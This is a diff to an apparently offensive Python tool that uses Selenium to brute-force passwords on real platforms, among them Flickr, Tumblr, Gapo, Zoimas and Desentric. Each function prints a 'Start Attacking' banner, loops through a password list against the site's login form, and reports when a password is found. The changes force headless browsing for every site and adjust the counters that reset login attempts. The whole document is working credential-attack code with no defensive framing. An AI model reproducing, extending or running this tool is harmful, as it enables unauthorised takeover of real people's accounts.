@@ -207,8 +207,7 @@ def gapo():
         Fore.LIGHTCYAN_EX, options.gapo, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Gapo+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     path = "//div[@id='root']/div[2]/div/div[2]/"
     count_socialname = [0, 'gapo']
     while count_while < len(password_list):
@@ -275,8 +274,7 @@ def biztime():
         Fore.LIGHTCYAN_EX, options.biztime, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Biztime+++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     count_socialname = [0, 'biztime']
     while count_while < len(password_list):
         try:
@@ -338,8 +336,7 @@ def hahalolo():
         Fore.LIGHTCYAN_EX, options.hahalolo, Fore.RESET))
     print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     count_socialname = [0, 'hahalolo']
     while count_while < len(password_list):
         try:
@@ -403,8 +400,7 @@ def flickr():
     print("{}Flickr Account: {}".format(Fore.LIGHTCYAN_EX, options.flickr))
     print("{}<<<<<<+++++Start Attacking Flickr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     brows = None
     er_id = ""
     count_socialname = [0, 'flickr']
@@ -476,8 +472,7 @@ def tumblr():
     print("{}Tumblr Account: {}".format(Fore.LIGHTCYAN_EX, options.tumblr))
     print("{}<<<<<<+++++Start Attacking Tumblr++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    # if options.gmail != None:
-    # ops.headless = True
+    ops.headless = True
     brows = None
     count_socialname = [0, 'tumblr']
     while count_while < len(password_list):
@@ -547,8 +542,7 @@ def zoimas():
     print("{}Zoimas Account: {}".format(Fore.LIGHTCYAN_EX, options.zoimas))
     print("{}<<<<<<+++++Start Attacking Zoimas++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     brows = None
     count_socialname = [0, 'zoimas']
     while count_while < len(password_list):
@@ -579,6 +573,8 @@ def zoimas():
                 if count_while == len(password_list):
                     brows.quit()
                     break
+                if count_login == 15:
+                    count_login = 0
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]ZOIMAS Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
@@ -606,8 +602,7 @@ def befilo():
     print("{}Befilo Account: {}".format(Fore.LIGHTCYAN_EX, options.befilo))
     print("{}<<<<<<+++++Start Attacking Befilo++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     brows = None
     count_socialname = [0, 'befilo']
     while count_while < len(password_list):
@@ -634,9 +629,6 @@ def befilo():
                 brows.find_element(
                     By.XPATH, "//input[@name='password']").clear()
                 count_login += 1
-                # if count_login == 5:
-                #     count_login = 0
-                #     brows.quit()
                 count_while += 1
                 if count_while == len(password_list):
                     brows.quit()
@@ -669,8 +661,7 @@ def desentric():
         Fore.LIGHTCYAN_EX, options.desentric))
     print("{}<<<<<<+++++Start Attacking Desentric++++>>>>>{}".format(Fore.LIGHTCYAN_EX, Fore.RESET))
     ops = Options()
-    if options.gmail != None:
-        ops.headless = True
+    ops.headless = True
     brows = None
     count_socialname = [0, 'desentric']
     while count_while < len(password_list):
@@ -715,13 +706,12 @@ def desentric():
                     By.XPATH, "//input[@name='password']").send_keys(Keys.SHIFT, Keys.HOME, Keys.BACKSPACE)
                 print(Fore.LIGHTRED_EX+"[X]DESENTRIC "+password+Fore.RESET)
                 count_login += 1
-                # if count_login == 5:
-                #     count_login = 0
-                #     brows.quit()
                 count_while += 1
                 if count_while == len(password_list):
                     brows.quit()
                     break
+                if count_login == 15:
+                    count_login = 0
             except selenium.common.exceptions.NoSuchElementException:
                 print(
                     "{}[V]DESENTRIC Password Found [{}]{}".format(Fore.LIGHTGREEN_EX, password, Fore.RESET))
